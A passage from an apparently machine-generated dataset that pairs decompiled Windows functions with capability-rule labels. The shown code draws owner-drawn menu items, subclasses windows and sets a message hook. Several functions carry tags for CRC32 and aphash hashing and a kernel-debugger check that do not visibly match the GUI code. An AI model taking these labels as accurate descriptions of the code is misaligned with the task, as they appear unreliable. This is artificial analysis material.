(*_sym.imp.USER32.dll_DrawEdge)(uVar5, &lprc, 6, 2);\n        fcn.004303e9(uVar6);\n        return;\n    }\n    uVar1 = *(arg_8h + 0x10);\n    var_44h = uVar1 & 2;\n    nYOrg = *(arg_8h + 0x20);\n    var_40h = uVar1 & 8;\n    var_50h = 0;\n    nXOrg = *(arg_8h + 0x1c);\n    arg_10h = 0;\n    if (*(arg_8h + 8) != -1) {\n        arg_10h = uVar1 & 1;\n    }\n    var_ch = *(in_ECX + 0x98) + nXOrg;\n    var_8h = *(in_ECX + 0x9c) + nYOrg;\n    var_60h = arg_10h;\n    var_38h = in_ECX;\n    (*_sym.imp.USER32.dll_OffsetRect)(&nXOrg, 0, (*(arg_8h + 0x28) - var_8h) / 2);\n    pcVar2 = _sym.imp.USER32.dll_GetSysColor;\n    i = *(var_54h + 0x10);\n    if (i < 0) {\n        var_98h = 0x30;\n        var_94h = 0x18;\n        _var_90h = 0;\n        _var_88h = 0;\n        _var_80h = 0;\n        _var_78h = 0;\n        _var_70h = 0;\n        (*_sym.imp.USER32.dll_GetMenuItemInfoW)(*(arg_8h + 0x14), *(arg_8h + 8), 0, &var_98h);\n        if ((var_40h != 0) || (var_7ch != 0)) {\n            if (var_40h != 0) {\n                var_7ch = var_80h;\n            }\n            var_50h = fcn.00404ec0(&var_3ch, &nXOrg, arg_10h, var_44h, var_90h >> 9 & 1, var_7ch);\n            uVar5 = var_3ch;\n        }\n        goto code_r0x004056d6;\n    }\n    var_50h = 1;\n    x = ((var_ch - *(var_38h + 0x90)) - nXOrg) / 2 + nXOrg;\n    y = ((var_8h - *(var_38h + 0x94)) - nYOrg) / 2 + nYOrg;\n    if (var_40h == 0) {\n        if (var_44h == 0) goto code_r0x004055f0;\n        (*_sym.imp.USER32.dll_FillRect)(uVar5, &nXOrg, 5);\ncode_r0x00405618:\n        uVar5 = (*_sym.imp.USER32.dll_GetSysColorBrush)(4);\n    }\n    else {\n        if ((arg_10h == 0) || (var_44h != 0)) {\n            uVar6 = (*_sym.imp.USER32.dll_GetSysColor)(0xf);\n            crColor = (*_sym.imp.GDI32.dll_SetTextColor)(uVar5, uVar6);\n            uVar6 = (*pcVar2)(0x14);\n            uVar6 = (*_sym.imp.GDI32.dll_SetBkColor)(uVar5, uVar6);\n            piVar3 = fcn.00405d80(&var_68h);\n            iVar4 = *piVar3;\n            (*_sym.imp.GDI32.dll_SetBrushOrgEx)(uVar5, nXOrg, nYOrg, 0);\n            (*_sym.imp.USER32.dll_FillRect)(uVar5, &nXOrg, iVar4);\n            (*_sym.imp.GDI32.dll_SetTextColor)(uVar5, crColor);\n            in_stack_ffffff04 = uVar5;\n            (*_sym.imp.GDI32.dll_SetBkColor)(uVar5, uVar6);\n            arg_8h = var_5ch;\n            arg_10h = var_60h;\n            if (iVar4 != 0) {\n                (*_sym.imp.GDI32.dll_DeleteObject)(iVar4);\n                arg_8h = var_5ch;\n                arg_10h = var_60h;\n            }\n        }\n        else {\ncode_r0x004055f0:\n            (*_sym.imp.USER32.dll_FillRect)(uVar5, &nXOrg, 5);\n        }\n        if (var_44h == 0) {\n            if ((arg_10h != 0) || (var_40h != 0)) {\n                lprc = nXOrg;\n                var_20h = nYOrg;\n                iStack32 = var_ch;\n                iStack28 = var_8h;\n                (*_sym.imp.USER32.dll_DrawEdge)(uVar5, &lprc, (var_40h == 0) * '\\x02' + '\\x02', 0xf);\n            }\n            (*_sym.imp.COMCTL32.dll_ImageList_Draw)(*(var_38h + 0x48), i, uVar5, x, y, 1);\n            goto code_r0x004056d6;\n        }\n        if (var_40h == 0) goto code_r0x00405618;\n        uVar5 = 0;\n    }\n    uVar6 = (*_sym.imp.USER32.dll_GetSysColorBrush)(0x10);\n    uVar6 = (*_sym.imp.USER32.dll_GetSysColorBrush)(0x14, uVar6);\n    fcn.00404d50(&var_3ch, i, x, y, uVar5, uVar6, in_stack_ffffff04);\n    uVar5 = var_3ch;\ncode_r0x004056d6:\n    i = *(var_38h + 0x98);\n    crColor = 4;\n    if (arg_10h != 0) {\n        crColor = 0xd;\n    }\n    x = (*_sym.imp.USER32.dll_GetSysColor)(crColor);\n    if ((arg_10h != 0) || (*(arg_8h + 0xc) == 2)) {\n        lprc = *(arg_8h + 0x1c);\n        var_20h = *(arg_8h + 0x20);\n        iStack32 = *(arg_8h + 0x24);\n        iStack28 = *(arg_8h + 0x28);\n        if (var_50h != 0) {\n            lprc = lprc + 1 + i;\n        }\n        (*_sym.imp.USER32.dll_FillRect)(uVar5, &lprc, crColor + 1);\n    }\n    iStack52 = *(arg_8h + 0x20);\n    iStack44 = *(arg_8h + 0x28);\n    var_2ch = *(arg_8h + 0x24) - i;\n    var_34h = *(arg_8h + 0x1c) + 3 + i;\n    (*_sym.imp.GDI32.dll_SetBkMode)(uVar5, 1);\n    pcVar2 = _sym.imp.USER32.dll_GetSysColor;\n    if (var_44h == 0) {\n        uVar5 = 7;\n        if (arg_10h != 0) {\n            uVar5 = 0xe;\n        }\n        iVar4 = (*_sym.imp.USER32.dll_GetSysColor)(uVar5);\n    }\n    else {\n        iVar4 = (*_sym.imp.USER32.dll_GetSysColor)(arg_10h + 0x10);\n        if ((arg_10h == 0) || (iVar4 == x)) {\n            lprc = var_34h;\n            var_20h = iStack52;\n            iStack32 = var_2ch;\n            iStack28 = iStack44;\n            (*_sym.imp.USER32.dll_OffsetRect)(&lprc, 1, 1);\n            uVar5 = (*pcVar2)(0x14);\n            fcn.00405b10(&var_3ch, &lprc, *(var_54h + 4), uVar5);\n        }\n    }\n    fcn.00405b10(&var_3ch, &var_34h, *(var_54h + 4), iVar4);\n    fcn.004303e9(iVar4);\n    return;\n}\n",
        "token_count": 2499
    },
    "004057f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004057f0(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint var_88h;\n    uint var_84h;\n    uint32_t var_80h;\n    uint var_78h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint var_60h;\n    int32_t *var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint32_t i;\n    uint var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    int32_t iStack52;\n    int32_t var_2ch;\n    int32_t iStack44;\n    int32_t qrc;\n    int32_t var_20h;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t lprc;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_4ch = *(arg_8h + 0x2c);\n    var_58h = arg_8h + 0x1c;\n    uVar4 = *(arg_8h + 0x18);\n    i = *(arg_8h + 0x10);\n    var_48h = i & 2;\n    var_44h = i & 8;\n    i = i & 1;\n    var_3ch = uVar4;\n    if (i == 0) {\n        if (*(arg_8h + 0xc) == 2) {\n            uVar2 = (*_sym.imp.USER32.dll_GetSysColorBrush)(4);\n            (*_sym.imp.USER32.dll_FillRect)(uVar4, arg_8h + 0x1c, uVar2);\n        }\n    }\n    else {\n        uVar2 = (*_sym.imp.USER32.dll_GetSysColorBrush)(0x1d);\n        (*_sym.imp.USER32.dll_FillRect)(uVar4, arg_8h + 0x1c, uVar2);\n        uVar2 = (*_sym.imp.USER32.dll_GetSysColorBrush)(0xd);\n        (*_sym.imp.USER32.dll_FrameRect)(uVar4, arg_8h + 0x1c, uVar2);\n    }\n    if ((*(var_4ch + 8) & 0x800) == 0) {\n        lprc = *(arg_8h + 0x1c);\n        var_38h = 0;\n        if (*(arg_8h + 8) != -1) {\n            var_38h = i;\n        }\n        var_10h = *(arg_8h + 0x20);\n        var_ch = *(in_ECX + 0x98) + lprc;\n        var_8h = *(in_ECX + 0x9c) + var_10h;\n        (*_sym.imp.USER32.dll_OffsetRect)(&lprc, 0, (*(arg_8h + 0x28) - var_8h) / 2);\n        if (var_44h != 0) {\n            qrc = lprc;\n            var_20h = var_10h;\n            iStack32 = var_ch;\n            iStack28 = var_8h;\n            (*_sym.imp.USER32.dll_InflateRect)(&qrc, 0xffffffff, 0xffffffff);\n            if (var_38h != 0) {\n                uVar2 = (*_sym.imp.USER32.dll_GetSysColorBrush)(4);\n                (*_sym.imp.USER32.dll_FillRect)(uVar4, &qrc, uVar2);\n            }\n            uVar2 = (*_sym.imp.USER32.dll_GetSysColorBrush)(0xd);\n            (*_sym.imp.USER32.dll_FrameRect)(uVar4, &qrc, uVar2);\n        }\n        pcVar1 = _sym.imp.USER32.dll_GetSysColorBrush;\n        i = *(var_4ch + 0x10);\n        if (i < 0) {\n            var_88h = 0x30;\n            var_84h = 0x18;\n            _var_80h = 0;\n            _var_78h = 0;\n            _var_70h = 0;\n            _var_68h = 0;\n            _var_60h = 0;\n            (*_sym.imp.USER32.dll_GetMenuItemInfoW)(*(arg_8h + 0x14), *(arg_8h + 8), 0, &var_88h);\n            uVar5 = var_38h;\n            if ((var_44h != 0) || (var_6ch != 0)) {\n                if (var_44h != 0) {\n                    var_6ch = var_70h;\n                }\n                fcn.00404ec0(&var_3ch, &lprc, var_38h, var_48h, var_80h >> 9 & 1, var_6ch);\n                uVar4 = var_3ch;\n            }\n        }\n        else {\n            var_54h = ((var_ch - *(in_ECX + 0x90)) - lprc) / 2 + lprc;\n            var_50h = ((var_8h - *(in_ECX + 0x94)) - var_10h) / 2 + var_10h;\n            if (var_48h == 0) {\n                (*_sym.imp.COMCTL32.dll_ImageList_Draw)(*(in_ECX + 0x48), i, uVar4, var_54h, var_50h, 1);\n                uVar5 = var_38h;\n            }\n            else {\n                if ((var_38h == 0) || (uVar4 = 0x1d,  var_44h != 0)) {\n                    uVar4 = 4;\n                }\n                uVar4 = (*_sym.imp.USER32.dll_GetSysColorBrush)(uVar4);\n                uVar2 = (*pcVar1)(0x10);\n                fcn.00404d50(&var_3ch, i, var_54h, var_50h, uVar4, uVar4, uVar2);\n                uVar4 = var_3ch;\n                uVar5 = var_38h;\n            }\n        }\n        iStack52 = var_58h[1];\n        iStack44 = var_58h[3];\n        var_2ch = var_58h[2] - *(in_ECX + 0x98);\n        var_34h = *var_58h + 3 + *(in_ECX + 0x98);\n        (*_sym.imp.GDI32.dll_SetBkMode)(uVar4, 1);\n        if (var_48h == 0) {\n            iVar3 = 7;\n            if (uVar5 != 0) {\n                iVar3 = 0xe;\n            }\n        }\n        else {\n            iVar3 = uVar5 + 0x10;\n        }\n        uVar4 = (*_sym.imp.USER32.dll_GetSysColor)(iVar3);\n        fcn.00405b10(&var_3ch, &var_34h, *(var_4ch + 4), uVar4);\n        fcn.004303e9(uVar4);\n        return;\n    }\n    qrc = *(arg_8h + 0x1c);\n    iStack32 = *(arg_8h + 0x24);\n    iStack28 = *(arg_8h + 0x28);\n    uVar2 = 2;\n    var_20h = *(arg_8h + 0x20) + (iStack28 - *(arg_8h + 0x20)) / 2;\n    (*_sym.imp.USER32.dll_DrawEdge)(uVar4, &qrc, 6);\n    fcn.004303e9(uVar2);\n    return;\n}\n",
        "token_count": 1880
    },
    "00406050": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00406050(int32_t param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    char cVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint hWnd;\n    uint hDC;\n    int32_t var_270h;\n    code *var_26ch;\n    uint var_268h;\n    uint var_264h;\n    int32_t var_188h;\n    int32_t var_184h;\n    int32_t var_180h;\n    int32_t var_17ch;\n    int32_t var_178h;\n    uint var_174h;\n    char var_170h;\n    char var_16fh;\n    char var_16eh;\n    char var_16dh;\n    uchar lpString2 [252];\n    int32_t lpvObject;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    char var_58h;\n    char var_57h;\n    char var_56h;\n    char var_55h;\n    uchar lpString1 [64];\n    int32_t lprc;\n    int32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_268h = 0x1f8;\n    cVar3 = fcn.004066f0(6, 0, 0);\n    if (cVar3 == '\\0') {\n        var_268h = 500;\n    }\n    fcn.00431db0(&var_264h, 0, 500);\n    var_26ch = _sym.imp.USER32.dll_SystemParametersInfoW;\n    iVar5 = (*_sym.imp.USER32.dll_SystemParametersInfoW)(0x29, 0x1f8, &var_268h, 0);\n    if (iVar5 != 0) {\n        fcn.00431db0(&lpvObject, 0, 0x5c);\n        if (*(param_1 + 0xa4) != 0) {\n            (*_sym.imp.GDI32.dll_GetObjectW)(*(param_1 + 0xa4), 0x5c, &lpvObject);\n        }\n        if (((((((lpvObject != var_188h) || (var_6ch != var_184h)) || (var_68h != var_180h)) ||\n              ((var_64h != var_17ch || (var_60h != var_178h)))) || (var_5ch != var_174h)) ||\n            ((((var_5ch._1_1_ != var_174h._1_1_ || (var_5ch._2_1_ != var_174h._2_1_)) ||\n              ((var_5ch._3_1_ != var_174h._3_1_ ||\n               (((var_58h != var_170h || (var_57h != var_16fh)) || (var_56h != var_16eh)))))) ||\n             ((var_55h != var_16dh || (iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(lpString1, lpString2),  iVar5 != 0)))))\n            ) && (iVar5 = (*_sym.imp.GDI32.dll_CreateFontIndirectW)(&var_188h), \n                 pcVar2 = _sym.imp.GDI32.dll_DeleteObject,  iVar5 != 0)) {\n            if ((*(param_1 + 0xa4) != 0) && (iVar6 = (*_sym.imp.GDI32.dll_DeleteObject)(*(param_1 + 0xa4)),  iVar6 != 0)\n               ) {\n                *(param_1 + 0xa4) = 0;\n            }\n            iVar6 = *(param_1 + 0xa4);\n            if ((iVar6 != 0) && (iVar6 != iVar5)) {\n                (*pcVar2)(iVar6);\n            }\n            *(param_1 + 0xa4) = iVar5;\n            pcVar2 = _sym.imp.USER32.dll_SendMessageW;\n            (*_sym.imp.USER32.dll_SendMessageW)(*(param_1 + 4), 0x30, iVar5, 1);\n            (*pcVar2)(*(param_1 + 4), 0x44d, 0, 0x47bf74);\n            (*pcVar2)(*(param_1 + 4), 0x421, 0, 0);\n        }\n    }\n    uVar1 = *(param_1 + 4);\n    uVar7 = (*_sym.imp.USER32.dll_GetWindowDC)(uVar1);\n    pcVar2 = _sym.imp.GDI32.dll_SelectObject;\n    var_270h = (*_sym.imp.GDI32.dll_SelectObject)(uVar7, *(param_1 + 0xa4));\n    _lprc = ZEXT816(0);\n    (*_sym.imp.USER32.dll_DrawTextW)(uVar7, 0x47bf7c, 0xffffffff, &lprc, 0x424);\n    if (var_ch - lprc < 4) {\n        (*_sym.imp.USER32.dll_SetRectEmpty)(&lprc);\n        (*_sym.imp.USER32.dll_DrawTextW)(uVar7, 0x47bf80, 0xffffffff, &lprc, 0x424);\n        var_ch = var_ch - lprc;\n    }\n    else {\n        var_ch = 0;\n    }\n    *(param_1 + 0xb0) = var_ch;\n    iVar5 = var_270h;\n    (*pcVar2)(uVar7);\n    cVar3 = fcn.004066f0(5, 0, 0);\n    pcVar2 = var_26ch;\n    if (cVar3 != '\\0') {\n        var_270h = 1;\n        iVar6 = (*var_26ch)(0x100a, 0, &var_270h, 0);\n        if ((iVar6 == 0) || (var_270h != 0)) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 2;\n        }\n        uVar4 = *(param_1 + 0x85) & 0xfd | uVar4 | 8;\n        *(param_1 + 0x85) = uVar4;\n        fcn.0040d5b0(~(uVar4 >> 1) & 1);\n    }\n    cVar3 = fcn.004066f0(5, 1, 0);\n    if (cVar3 != '\\0') {\n        var_26ch = NULL;\n        iVar6 = (*pcVar2)(0x1022, 0, &var_26ch, 0);\n        if ((iVar6 == 0) || (var_26ch == NULL)) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(param_1 + 0x85) = *(param_1 + 0x85) & 0xfe | uVar4;\n    }\n    if (((((*(param_1 + 0x58) & 0x10) == 0) && (cVar3 = fcn.004066f0(6, 0, 0),  cVar3 != '\\0')) &&\n        (cVar3 = fcn.004065c0(),  cVar3 != '\\0')) &&\n       ((iVar6 = (*_sym.imp.UxTheme.dll_IsThemeActive)(),  iVar6 != 0 &&\n        (iVar6 = (*_sym.imp.UxTheme.dll_IsAppThemed)(),  iVar6 != 0)))) {\n        uVar4 = 1;\n    }\n    else {\n        uVar4 = 0;\n        if (((*(param_1 + 0x86) & 1) != 0) && ((*(param_1 + 0x44) != 0 && (0 < *(param_1 + 0x50))))) {\n            fcn.0040f040();\n            uVar4 = 0;\n        }\n    }\n    *(param_1 + 0x86) = *(param_1 + 0x86) & 0xfe | uVar4;\n    (*_sym.imp.USER32.dll_ReleaseDC)(uVar1, uVar7);\n    fcn.004303e9(iVar5);\n    return;\n}\n",
        "token_count": 1928
    },
    "00407000": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407000(uint Msg, int32_t *wParam, uint lParam)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    int32_t in_ECX;\n    uint *arg_8h;\n    \n    uVar2 = (*_sym.imp.USER32.dll_CallWindowProcW)(*(in_ECX + 0x40), *(in_ECX + 4), Msg, wParam, lParam);\n    fcn.00406050();\n    pcVar1 = _sym.imp.USER32.dll_GetParent;\n    iVar3 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 4));\n    iVar4 = (*pcVar1)(iVar3);\n    while (iVar4 != 0) {\n        iVar5 = (*pcVar1)(iVar4);\n        iVar3 = iVar4;\n        iVar4 = iVar5;\n    }\n    iVar4 = *(in_ECX + 0x6c);\n    if (iVar4 == 0) {\n        iVar4 = fcn.0042f74e();\n        *(in_ECX + 0x6c) = iVar4;\n        if (iVar4 != 0) goto code_r0x0040705f;\n    }\n    else {\ncode_r0x0040705f:\n        fcn.0042f850(iVar4, fcn.0040e4c0, in_ECX + 0x5c);\n        uVar6 = fcn.0042f7b3(*(in_ECX + 0x6c));\n        iVar4 = (*_sym.imp.USER32.dll_SetWindowLongW)(iVar3, 0xfffffffc, uVar6);\n        if (iVar4 != 0) {\n            *(in_ECX + 0x74) = iVar4;\n            *(in_ECX + 0x5c) = iVar3;\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_SendMessageW;\n    (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x41e, 0x14, 0);\n    (*pcVar1)(*(in_ECX + 4), 0x430, 0, 0);\n    uVar6 = 0x6c9c60;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    if (*0x6cc7b4 == NULL) {\n        *0x6cc7b4 = fcn.0042faca(0xc, uVar6);\n        if (*0x6cc7b4 == NULL) {\n            *0x6cc7b4 = NULL;\n            goto code_r0x0040717f;\n        }\n        **0x6cc7b4 = 0;\n        (*0x6cc7b4)[1] = 0;\n        (*0x6cc7b4)[2] = 0;\n    }\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    arg_8h = &lParam;\n    lParam = uVar6;\n    iVar3 = fcn.004067a0(arg_8h);\n    if (iVar3 == 0) {\n        piVar7 = fcn.0042faca(8, arg_8h);\n        if (piVar7 == NULL) {\n            (*_sym.imp.USER32.dll_SetWindowsHookExW)(3, fcn.004067f0, *0x6cc7e0, uVar6);\n        }\n        else {\n            *piVar7 = 0;\n            piVar7[1] = 0;\n            wParam = piVar7;\n            iVar3 = (*_sym.imp.USER32.dll_SetWindowsHookExW)(3, fcn.004067f0, *0x6cc7e0);\n            if (iVar3 != 0) {\n                *piVar7 = iVar3;\n                piVar7[1] = 1;\n                fcn.00402290(&lParam, &wParam);\n            }\n        }\n    }\n    else {\n        *(iVar3 + 4) = *(iVar3 + 4) + 1;\n    }\ncode_r0x0040717f:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x6c9c60);\n    uVar8 = (*_sym.imp.USER32.dll_GetWindowLongW)(*(in_ECX + 4), 0xffffffec);\n    *(in_ECX + 0x85) = *(in_ECX + 0x85) & 0xbf | (uVar8 >> 0x16 & 1) << 6;\n    return uVar2;\n}\n",
        "token_count": 1057
    },
    "00407720": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407720(uint Msg, int32_t wParam, uint lParam)\n\n{\n    code *pcVar1;\n    int32_t **arg_8h;\n    uint uVar2;\n    uint *arg_8h_00;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t *piVar4;\n    int32_t iVar5;\n    \n    uVar2 = (*_sym.imp.USER32.dll_CallWindowProcW)(*(in_ECX + 0x40), *(in_ECX + 4), Msg, wParam, lParam);\n    lParam = uVar2;\n    if (((*(in_ECX + 0x86) & 1) != 0) && (*(in_ECX + 0x44) != 0)) {\n        fcn.0040f040();\n    }\n    pcVar1 = _sym.imp.GDI32.dll_DeleteObject;\n    iVar5 = 0;\n    if (0 < *(in_ECX + 0xb8)) {\n        do {\n            if ((iVar5 < 0) || (*(in_ECX + 0xb8) <= iVar5)) {\n                fcn.00402f30(0x8000000b);\n                pcVar1 = swi(3);\n                uVar2 = (*pcVar1)();\n                return uVar2;\n            }\n            iVar3 = *(*(in_ECX + 0xb4) + iVar5 * 4);\n            if (iVar3 != 0) {\n                (*pcVar1)(iVar3);\n            }\n            iVar5 = iVar5 + 1;\n            uVar2 = lParam;\n        } while (iVar5 < *(in_ECX + 0xb8));\n    }\n    if ((*(in_ECX + 0x84) & 2) != 0) {\n        return uVar2;\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x6c9c60);\n    if (*0x6cc7b4 != NULL) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        wParam = iVar5;\n        arg_8h_00 = fcn.004067a0(&wParam);\n        if (arg_8h_00 != NULL) {\n            piVar4 = arg_8h_00 + 1;\n            *piVar4 = *piVar4 + -1;\n            if (*piVar4 == 0) {\n                (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*arg_8h_00);\n                iVar3 = 0;\n                if (0 < (*0x6cc7b4)[2]) {\n                    piVar4 = **0x6cc7b4;\n                    do {\n                        if (*piVar4 == iVar5) {\n                            if ((iVar3 != -1) && (iVar5 = fcn.0040d010(iVar3),  iVar5 != 0)) {\n                                fcn.0042fafa(arg_8h_00);\n                            }\n                            break;\n                        }\n                        iVar3 = iVar3 + 1;\n                        piVar4 = piVar4 + 1;\n                    } while (iVar3 < (*0x6cc7b4)[2]);\n                }\n            }\n            arg_8h = *0x6cc7b4;\n            if ((*0x6cc7b4)[2] == NULL) {\n                if (**0x6cc7b4 != NULL) {\n                    fcn.0043bd54(**0x6cc7b4);\n                    *arg_8h = NULL;\n                }\n                if (arg_8h[1] != NULL) {\n                    fcn.0043bd54(arg_8h[1]);\n                    arg_8h[1] = NULL;\n                }\n                arg_8h[2] = NULL;\n                fcn.0042fafa(arg_8h);\n                *0x6cc7b4 = NULL;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x6c9c60);\n    return lParam;\n}\n",
        "token_count": 886
    },
    "00407a30": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00407a30(uint noname_0, uint noname_1, int32_t *arg_10h, uint *arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t in_ECX;\n    int32_t lpBuffer;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = arg_10h[0xb];\n    if ((*arg_10h == 1) && (piVar1 != NULL)) {\n        var_4h = 0;\n        _lpBuffer = ZEXT816(0);\n        _var_ch = 0;\n        (*_sym.imp.KERNEL32.dll_VirtualQuery)(piVar1, &lpBuffer, 0x1c);\n        if ((lpBuffer != 0) && (((_var_ch & 0x600000000) != 0 && (*piVar1 == 0x1313)))) {\n            if ((*(in_ECX + 0x85) & 1) != 0) {\n                fcn.004057f0(arg_10h);\n                return 1;\n            }\n            fcn.004053e0(arg_10h);\n            return 1;\n        }\n    }\n    *arg_14h = 0;\n    return 1;\n}\n",
        "token_count": 300
    },
    "00407b30": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407b30(uint noname_0, uint32_t arg_ch, uint noname_2, uint *arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    \n    *arg_14h = 0;\n    pcVar1 = _sym.imp.USER32.dll_SendMessageW;\n    if (arg_ch == 0x1b) {\n        if (1 < *(in_ECX + 0xc)) {\n            return 0;\n        }\n        if ((*(in_ECX + 0x84) & 0x11) == 1) {\n            iVar2 = (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x447, 0, 0);\n            if (iVar2 == -1) {\n                iVar2 = *(in_ECX + 0x88);\n            }\n            iVar3 = 0;\n            if (iVar2 != -1) {\n                iVar3 = iVar2;\n            }\n            (*pcVar1)(*(in_ECX + 4), 0x448, iVar3, 0);\n            *arg_14h = 1;\n            fcn.0040d960();\n            *(in_ECX + 0x84) = *(in_ECX + 0x84) | 0x20;\n            *(in_ECX + 0x85) = *(in_ECX + 0x85) & 0x7f;\n            return 0;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar2 != *(in_ECX + 4)) {\n            return 0;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(in_ECX + 0x5c));\n        if (iVar2 == 0) {\n            return 0;\n        }\n        (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x448, 0xffffffff, 0);\n        fcn.004064e0();\n        *arg_14h = 1;\n        return 0;\n    }\n    if (((arg_ch == 0xd) || (arg_ch == 0x26)) || (arg_ch == 0x28)) {\n        if ((((*(in_ECX + 0x84) & 1) == 0) && (iVar2 = (*_sym.imp.USER32.dll_GetFocus)(),  iVar2 == *(in_ECX + 4))) &&\n           ((iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(in_ECX + 0x5c)),  iVar2 != 0 &&\n            (iVar2 = (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x447, 0, 0),  iVar2 != -1)))) {\n            if (arg_ch != 0xd) {\n                if (-1 < *(in_ECX + 0x85)) {\n                    (*_sym.imp.USER32.dll_PostMessageW)(*(in_ECX + 4), 0x100, 0x28, 0);\n                    *(in_ECX + 0x85) = *(in_ECX + 0x85) | 0x80;\n                    return 0;\n                }\n                *(in_ECX + 0x85) = *(in_ECX + 0x85) & 0x7f;\n                return 0;\n            }\n        }\n        else if (arg_ch != 0xd) {\n            return 0;\n        }\n        if ((*(in_ECX + 0x84) & 1) == 0) {\n            return 0;\n        }\n        (*_sym.imp.USER32.dll_PostMessageW)(*(in_ECX + 4), 0x448, 0xffffffff, 0);\n        *(in_ECX + 0x8c) = 0xffffffff;\n        fcn.004064e0();\n        return 0;\n    }\n    if ((arg_ch != 0x25) && (arg_ch != 0x27)) {\n        return 0;\n    }\n    bVar7 = false;\n    uVar5 = *(in_ECX + 0x85) >> 5;\n    uVar6 = ~uVar5 & 2 | 0x25;\n    if ((*(in_ECX + 0x84) & 0x11) != 1) {\n        return 0;\n    }\n    if ((arg_ch == uVar6) && ((*(in_ECX + 0x84) & 8) != 0)) {\n        return 0;\n    }\n    if ((arg_ch == (uVar5 | 0x25)) && (*(*0x6cc7bc + 8) == 1)) {\n        iVar2 = fcn.00405f70(*(in_ECX + 0x88));\n        bVar7 = iVar2 != -1;\n    }\n    else {\n        if (arg_ch != uVar6) goto code_r0x00407cb5;\n        iVar2 = fcn.00405e90(*(in_ECX + 0x88));\n        bVar7 = false;\n        if (iVar2 != -1) {\n            bVar7 = true;\n        }\n    }\n    *(in_ECX + 0x8c) = iVar2;\ncode_r0x00407cb5:\n    iVar2 = *(in_ECX + 0xc) + -1;\n    if (iVar2 < 0) {\n        uVar4 = 0;\n    }\n    else {\n        uVar4 = *(*(in_ECX + 8) + iVar2 * 4);\n    }\n    if (!bVar7) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_PostMessageW)(uVar4, 0x100, 0x1b, 0);\n    pcVar1 = _sym.imp.USER32.dll_PostMessageW;\n    if (arg_ch == uVar6) {\n        iVar2 = *(in_ECX + 0xc);\n        while (iVar2 = iVar2 + -1,  -1 < iVar2) {\n            if ((iVar2 < 0) || (*(in_ECX + 0xc) <= iVar2)) {\n                fcn.00402f30(0x8000000b);\n                